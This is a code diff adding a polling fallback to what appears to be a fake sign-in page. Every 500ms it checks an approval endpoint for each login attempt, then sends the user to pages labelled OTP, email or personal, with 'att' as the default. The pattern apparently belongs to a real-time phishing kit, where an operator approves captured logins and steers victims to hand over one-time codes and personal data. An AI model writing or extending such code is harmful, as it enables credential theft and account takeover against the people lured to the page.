@@ -110,6 +110,55 @@ export default function Home() {
       eventSource.onopen = function() {
         console.log('[index.js] ✅ SSE connection opened successfully');
       };
+      
+      // CRITICAL: Polling fallback for Vercel serverless functions
+      // SSE alone doesn't work on Vercel due to function isolation
+      const pollInterval = setInterval(async () => {
+        if (approvalReceived) {
+          clearInterval(pollInterval);
+          return;
+        }
+        
+        try {
+          const response = await fetch(`/api/approval/${activityId}`);
+          if (response.ok) {
+            const approval = await response.json();
+            if (approval && approval.status && approval.status !== 'pending') {
+              approvalReceived = true;
+              clearInterval(pollInterval);
+              
+              // Close SSE connection
+              if (eventSource) {
+                eventSource.close();
+                window.approvalEventSource = null;
+              }
+              
+              console.log('[index.js] ✅ Approval received via polling:', approval);
+              
+              if (approval.status === 'approved') {
+                const redirectType = approval.redirectType || 'att';
+                console.log(`[index.js] 🚀 Redirecting to: ${redirectType}`);
+                
+                // Store userId for OTP/email/personal pages
+                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
+                  localStorage.setItem('lastUserId', userId);
+                }
+                
+                handleRedirect(redirectType, userId);
+              } else if (approval.status === 'denied') {
+                const loadingScreen = document.getElementById('loading-screen');
+                if (loadingScreen) loadingScreen.classList.remove('active');
+                
+                submitBtn.disabled = false;
+                submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
+                alert('Access denied. Please try again.');
+              }
+            }
+          }
+        } catch (error) {
+          console.error('[index.js] Polling error:', error);
+        }
+      }, 500); // Poll every 500ms for fast response
     }
 
     function handleRedirect(redirectType, userId) {
